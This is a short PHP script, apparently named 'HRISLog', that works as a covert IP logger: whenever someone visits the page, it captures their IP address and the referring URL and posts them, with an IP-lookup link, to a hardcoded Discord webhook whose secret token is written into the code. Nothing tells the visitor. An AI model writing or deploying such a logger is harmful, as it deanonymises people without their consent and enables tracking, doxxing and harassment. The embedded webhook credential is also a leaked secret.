<?php

if (isset($_GET['hackerlol']))
  die("Won't do anything.");


function getFullUrl()
{
  if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')
    $link = "https";
  else
    $link = "http";
  $link .= "://";
  $link .= $_SERVER['HTTP_HOST'];
  $link .= $_SERVER['REQUEST_URI'];
  return $link;
}

function getUserIP()
{
  $ipaddress = '';
  if (isset($_SERVER['HTTP_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
  else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_X_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
  else if (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
    $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
  else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
  else if (isset($_SERVER['HTTP_FORWARDED']))
    $ipaddress = $_SERVER['HTTP_FORWARDED'];
  else if (isset($_SERVER['REMOTE_ADDR']))
    $ipaddress = $_SERVER['REMOTE_ADDR'];
  else
    $ipaddress = 'UNKNOWN';
  return $ipaddress;
}

$ip = getUserIP();
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : getFullUrl();

$webhookurl = "https://discord.com/api/webhooks/912653409449041960/vwHKE0wU7HSJJvCZou27U9HhQuBVUOIkQ16ub0RChZt-o56tMoosz_5NrmKRbwaLptDj";
$timestamp = date("c", strtotime("now"));

$checkhosturl = "https://check-host.net/ip-info?host=$ip";
$version = file_get_contents('version.txt');
$json_data = '
    {
    "content": null,
    "embeds": [
      {
        "title": "IP Logged",
        "description": "Someone\'s IP was just logged.",
        "url": "' . $checkhosturl . '",
        "color": 5814783,
        "fields": [
            {
              "name": "URL",
              "value": "' . $referer . '",
              "inline": "true"
            },
            {
              "name": "IP",
              "value": "' . $ip . ' [Check Host](' . $checkhosturl . ')",
              "inline": "true"
            }
        ],
        "author": {
          "name": "HRISLog v' . $version . '"
        }
      }
    ]
  }
  ';


$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);
